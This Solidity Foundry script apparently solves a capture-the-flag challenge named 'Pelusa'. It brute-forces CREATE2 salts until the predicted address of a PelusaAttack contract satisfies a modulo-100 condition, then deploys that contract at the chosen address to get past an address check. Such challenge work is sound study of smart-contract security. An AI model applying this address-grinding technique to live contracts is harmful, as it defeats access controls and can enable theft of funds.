// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "../src/attacks/PelusaAttack.sol";

contract PelusaScript is Script {
    address public toDeployAddress;
    uint public salt;
    
    // 2. Compute the address of the contract to be deployed
    // NOTE: _salt is a random number used to create an address
    function getAddress(bytes memory bytecode, uint _salt)
        public
        view
        returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode))
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }

    function checkAddress(uint from, uint to)  public {
        for (uint i = from; i < to; i++) {
            address addr = getAddress(type(PelusaAttack).creationCode, i);
            console.log(addr, i, uint256(uint160(addr)) % 100);
            if (uint256(uint160(addr)) % 100 == 10) {
                toDeployAddress = addr;
                salt = i;
                break;
            }
        }        
    }

    function tryCreate2(bytes memory _code, uint _salt) public returns (address){
        address x;
        assembly {
            x := create2(0, add(_code, 0x20), mload(_code), _salt)
        }       
        return x; 
    }    

    function run() public {
        checkAddress(0, 1000);
        console.log("Final Salt %d", salt);
        address addr = tryCreate2(type(PelusaAttack).creationCode, salt);
        console.logAddress(addr);
    }
}